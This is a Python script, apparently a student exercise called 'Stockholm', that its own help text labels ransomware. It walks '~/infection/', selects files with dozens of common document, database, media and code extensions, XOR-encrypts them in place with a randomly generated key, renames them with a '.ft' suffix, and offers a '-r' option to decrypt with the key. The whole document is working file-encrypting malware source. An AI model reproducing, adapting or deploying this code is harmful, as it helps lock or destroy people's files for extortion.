import hashlib
import os.path
import pathlib
import argparse
import secrets
import string
from itertools import cycle


DIRECTORY = os.path.expanduser("~/infection/")
KEY_TAG_SIZE = hashlib.sha256().digest_size
ALLOWED_EXTENSIONS = {
    ".123", ".7z", ".accdb", ".ai", ".asp", ".aspx", ".avi", ".bak", ".bmp",
    ".c", ".cfg", ".conf", ".cpp", ".cs", ".csv", ".db", ".dbf",
    ".doc", ".docm", ".docx", ".dwg", ".eml", ".flv", ".gif",
    ".h", ".hpp", ".html", ".java", ".jpeg", ".jpg", ".js", ".json",
    ".key", ".mdb", ".mdf", ".mov", ".mp3", ".mp4", ".mpeg", ".msg",
    ".odt", ".ost", ".pdf", ".php", ".png", ".ppt", ".pptx", ".psd",
    ".pst", ".py", ".rar", ".rtf", ".sql", ".tar", ".txt", ".vb",
    ".vbs", ".vsd", ".wav", ".wma", ".xls", ".xlsm", ".xlsx", ".xml",
    ".zip"
}

def parse_args() :
    parser = argparse.ArgumentParser(
        prog='Stockholm',
        description='Ransomware'
    )
    parser.add_argument("-r", help="reverse the infection")
    parser.add_argument("-v", "--version", action="version", version="Stockholm 1.0.0")
    parser.add_argument("-s", "--silent", action='store_true', dest='s', help="silent mode: don't print infected files")
    args = parser.parse_args()
    return args

def read_directory(directory) :
    args = parse_args()
    try:
        files = os.listdir(directory)
    except FileNotFoundError:
        print(f"Directory not found: {directory}")
        return []

    new_files = []
    for file in files:
        full_path = os.path.join(directory, file)
        path = pathlib.Path(full_path)
        suffix = path.suffix.lower()
        if suffix == ".ft" or suffix in ALLOWED_EXTENSIONS:
            new_files.append(full_path)
            if not args.s:
                print(full_path)
    return new_files

def print_extension(directory) :
    res = read_directory(directory)
    for file in res :
        path = pathlib.Path(file)
        print(path.suffix)

def rename_file(file) :
    path = pathlib.Path(file)
    if path.suffix != ".ft" :
        try:
            os.rename(file, file + ".ft")
        except PermissionError:
            print(f"Erreur permission: impossible de renommer {file}")
        except OSError as err:
            print(f"Erreur renommage {file}: {err}")

def xor_file_encrypt(input_path, key):
    try:
        with open(input_path, 'rb') as f_in:
            data = f_in.read()
    except PermissionError:
        print(f"Erreur permission: impossible de lire {input_path}")
        return
    except OSError as err:
        print(f"Erreur lecture {input_path}: {err}")
        return
    
    key_bytes = key.encode()
    key_cycle = cycle(key_bytes)
    
    key_tag = hashlib.sha256(key_bytes).digest()

    encrypted = bytes(b ^ k for b, k in zip(data, key_cycle))
    
    try:
        with open(input_path, 'wb') as f_out:
            f_out.write(key_tag + encrypted)
    except PermissionError:
        print(f"Erreur permission: impossible d'ecrire {input_path}")
    except OSError as err:
        print(f"Erreur ecriture {input_path}: {err}")

def xor_file_decrypt(input_path, key):
    try:
        with open(input_path, 'rb') as f_in:
            data = f_in.read()
    except PermissionError:
        print(f"Erreur permission: impossible de lire {input_path}")
        return
    except OSError as err:
        print(f"Erreur lecture {input_path}: {err}")
        return

    key_bytes = key.encode()
    if len(data) < KEY_TAG_SIZE:
        print("Erreur: Clé incorrecte!")
        exit(1)

    expected_tag = hashlib.sha256(key_bytes).digest()
    stored_tag = data[:KEY_TAG_SIZE]

    if stored_tag != expected_tag:
        print("Erreur: Clé incorrecte!")
        return
    
    # Réinitialiser le cycle pour le reste des données
    key_cycle = cycle(key_bytes)
    
    decrypted = bytes(b ^ k for b, k in zip(data[KEY_TAG_SIZE:], key_cycle))

    try:
        with open(input_path, 'wb') as f_out:
            f_out.write(decrypted)
    except PermissionError:
        print(f"Erreur permission: impossible d'ecrire {input_path}")
        return
    except OSError as err:
        print(f"Erreur ecriture {input_path}: {err}")
        return
    
    path = pathlib.Path(input_path)
    if path.suffix == ".ft":
        new_name = str(path).replace(".ft", "")
        try:
            os.rename(input_path, new_name)
        except PermissionError:
            print(f"Erreur permission: impossible de renommer {input_path}")
        except OSError as err:
            print(f"Erreur renommage {input_path}: {err}")
    


def generate_secret_key(longueur=16):
    alphabet = string.ascii_letters + string.digits
    key = ''.join(secrets.choice(alphabet) for _ in range(longueur))
    return key

def main() :
    files = read_directory(DIRECTORY)
    args = parse_args()

    if args.r :
        for file in files :
            if file.endswith(".ft") :
                xor_file_decrypt(file, args.r)
            
    else :
        key = generate_secret_key()
        print("Save your key : " + key)

        for file in files:
            xor_file_encrypt(file, key)
            rename_file(file)
    


if "__main__" == __name__ :
    main()